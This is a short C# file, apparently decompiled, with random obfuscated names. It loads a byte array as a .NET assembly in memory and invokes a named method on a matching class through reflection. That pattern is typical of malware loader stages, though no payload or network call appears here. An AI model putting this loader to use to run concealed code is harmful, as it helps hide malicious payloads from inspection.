using System;
using System.Reflection;
using System.Runtime.CompilerServices;

public class zrnszsateb
{
	public class ASMInit
	{
		private Assembly assembly_0;

		public ASMInit(byte[] Init)
		{
			assembly_0 = Assembly.Load(Init);
		}

		public Assembly Ret()
		{
			return assembly_0;
		}
	}

	internal sealed class Class3
	{
		internal sealed class Class4
		{
		}

		private static bool bool_0;
	}

	private byte[] ijsdfreuey;

	private string etfizuxham;

	private string nljtfubiaj;

	internal object[] object_0;

	public zrnszsateb(byte[] sobjfwywvu, string cggulwdxvs, string xqszfyvlrg, object[] hixklyalqd)
	{
		ijsdfreuey = sobjfwywvu;
		etfizuxham = cggulwdxvs;
		nljtfubiaj = xqszfyvlrg;
		object[] array = (object_0 = hixklyalqd);
	}

	public void qacvqxemqa()
	{
		ASMInit aSMInit = new ASMInit(ijsdfreuey);
		Assembly assembly = aSMInit.Ret();
		Type[] types = assembly.GetTypes();
		foreach (Type type in types)
		{
			if (type.IsClass && type.FullName!.EndsWith("." + etfizuxham))
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type));
				type.InvokeMember(nljtfubiaj, BindingFlags.InvokeMethod, null, RuntimeHelpers.GetObjectValue(objectValue), object_0);
			}
		}
	}
}
